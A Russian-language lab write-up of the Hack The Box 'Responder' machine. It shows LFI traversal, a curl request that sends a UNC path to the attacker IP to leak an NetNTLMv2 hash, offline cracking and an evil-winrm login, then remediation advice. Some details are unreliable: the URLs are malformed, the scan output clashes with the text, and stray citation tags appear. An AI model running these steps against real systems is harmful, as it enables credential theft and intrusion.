# Hack-The-Box-Responder-Writeup-Tier-1-Starting-Point-

**Дата проведения аудита:** 13 октября 2026 г.
**Платформа атаки:** Kali Linux arm64 (Hypervisor: VMware Fusion Pro, Apple Silicon M4)
**Целевой хост (Target IP):** `10.129.44.122`
**Результат:** Успешный взлом Windows-инфраструктуры через связку Local File Inclusion (LFI) и релей-атаку (NTLM Leak), неавторизованное получение интерактивного PowerShell-шелла, эксфильтрован Root-флаг.

---
## 1. Введение и Теоретический анализ уязвимостей
В ходе планового тестирования на проникновение исследован изолированный корпоративный Windows-сервер под кодовым именем `Responder`. Данный аудит демонстрирует критические риски, связанные с халатной фильтрацией пользовательского ввода в веб-приложениях и архитектурными дефектами протоколов аутентификации ОС Windows в экосистеме Active Directory.

### 1.1. Физика эксплуатации Local File Inclusion (LFI)
Уязвимость классифицируется по OWASP как **A03:2021-Injection**. Бэкенд-скрипт `index.php` принимает внешние данные в GET-параметр `page` и без надлежащей санитизации передает их в исполняемую функцию `include()`. На Windows-платформах интерпретатор PHP поддерживает обработку путей общего доступа Universal Naming Convention (UNC). Это позволяет перенаправить внутренний системный вызов на сторонний сетевой SMB-ресурс.

### 1.2. Механизм утечки и перехвата хэшей NetNTLMv2
При принудительном обращении к удаленному SMB-серверу операционная система Windows автоматически инициирует сессию проверки подлинности, отправляя зашифрованный Challenge/Response ответ. Утилита `Responder` перехватывает этот трафик, выступая в роли поддельного аутентификатора, и извлекает NetNTLMv2-хэш текущей учетной записи администратора для последующего офлайн-анализа.

## 2. Этап Black Box разведки и верификации периметра (Enumeration)
### 2.1. Анализ стабильности сетевого моста
Проведена проверка качества связи с облаком AWS через утилиту `ping`:
bash
ping -c 3 10.129.44.122
**Результат:** Пакеты доставлены со 100% успехом (`0% packet loss`), сетевой контур туннеля OpenVPN верифицирован.
 
### 2.2. Направленное сканирование портов (Nmap)
Для обнаружения активных сетевых сокетов и точного определения версий запущенных служб было выполнено веерное сканирование периметра:
bash
sudo nmap -p- --min-rate 1000 -sV 10.129.44.122
**Лог работы сканера Nmap:**
text
PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Анализ выявил открытый веб-сервер на стандартном порту удаленного управления **WinRM (5985/tcp)**, функционирующий под управлением ОС семейства Windows.
 
### 2.3. Name-Based Virtual Hosting и маппинг домена
Попытка прямого обращения к HTTP-серверу выявила принудительное перенаправление на внутреннее имя хоста. Для корректной маршрутизации пакетов доменное имя было жестко привязано к целевому IP-адресу в локальном конфигурационном файле атакующей станции Kali Linux:
bash
echo "10.129.44.122 unika.htb" | sudo tee -a /etc/hosts

## 3. Практическая эксплуатация и прорыв периметра (Exploitation)
### 3.1. Доказательство уязвимости LFI (Proof of Concept)
При открытии адреса `http://unika.htb` в браузере Firefox была протестирована глубина фильтрации ввода. Путем подстановки относительного пути с обходом каталогов назад (`../`) бэкенд PHP успешно выгрузил на веб-страницу содержимое защищенного системного файла Windows HOSTS:
text
http://unika.htbindex.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
Факт неавторизованного чтения локальных файлов подтвержден.

### 3.2. Перехват хэша NetNTLMv2 через SMB-ловушку
Для сбора учетных данных в отдельном Терминале Kali Linux была взведена сетевая ловушка на интерфейсе `tun0`:
bash
sudo responder -I tun0

С помощью консольной утилиты `curl` в уязвимый PHP-параметр передан UNC-путь, указывающий на IP-адрес атакующего хоста (`10.10.14.176`):
bash
curl -v "http://unika.htbindex.php?page=//10.10.14.176/somefile"
 
Удаленный веб-сервер Apache выполнил код, стриггерил Windows-аутентификацию, и утилита `Responder` успешно перехватила NetNTLMv2-хэш учетной записи `Administrator`.
 
### 3.3. Высокоскоростной офлайн-брутфорс (John the Ripper)
Перехваченный блок данных изолирован в текстовый файл `hash.txt`.
 
В связи с тем, что встроенный словарь Kali Linux находился в архиве, произведена декомпрессия утилитой `gzip`. Для расшифровки была запущена атака перебора по миллионному словарю `rockyou.txt`:
bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
**Result:** Пароль администратора был успешно извлечен:
👉 **`badminton (Administrator)`** [PDF: 0.1.15]
 
### 3.4. Получение удаленного PowerShell-шелла Windows
Используя легитимные скомпрометированные данные и открытый порт 5985/tcp, инициировано удаленное подключение через WinRM-интерфейс:
bash
evil-winrm -i 10.129.44.122 -u administrator -p badminton
Интерактивный PowerShell-шелл уровня суперадминистратора успешно развернут. Осуществлен переход в домашнюю директорию целевого пользователя `mike` и эксфильтрован финальный Root-токен:
powershell
*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac

## 5. Рекомендации по устранению уязвимостей (Remediation)
1. **Блокировка удаленных включений в PHP:**
В файле конфигурации `php.ini` принудительно выставить директиву `allow_url_include = Off`, заблокировав выполнение внешних UNC и SMB путей функцией `include()` [PDF: 0.1.12].
2. **Внедрение строгого Whitelisting в коде:**
Полностью отказаться от прямой конкатенации параметров из массива `$_GET` [PDF: 0.1.10]. Реализовать жесткую проверку входных данных (разрешить загрузку файлов строго по фиксированному списку разрешенных имен).
3. **Фильтрация SMB на сетевом периметре:**
На корпоративном брандмауэре (Firewall) настроить строгие правила, полностью блокирующие любой исходящий трафик по портам `139/tcp` и `445/tcp` во внешние публичные сети, чтобы предотвратить утечку хэшей за пределы домена Active Directory
